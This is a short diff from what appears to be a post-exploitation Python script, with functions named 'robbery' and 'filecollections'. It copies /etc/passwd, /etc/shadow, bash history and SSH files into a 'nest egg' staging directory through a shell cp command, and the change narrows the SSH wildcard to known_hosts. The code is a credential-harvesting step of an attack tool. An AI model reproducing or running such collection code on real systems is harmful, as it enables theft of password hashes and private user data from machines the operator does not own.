@@ -53,7 +53,7 @@ def robbery(osinfo,path):
 # Attempts to copy each collection file into nest egg directory
 # Prints out failed copies
 def filecollections(path):
-    files = ["/etc/passwd","/etc/shadow","~/.bash_history","~/.ssh/*"]
+    files = ["/etc/passwd","/etc/shadow","~/.bash_history","~/.ssh/known_hosts"]
     existing = []
     for fname in files:
         cmd = "cp " + fname + " " + path.replace(" ", "\ ") + "/"
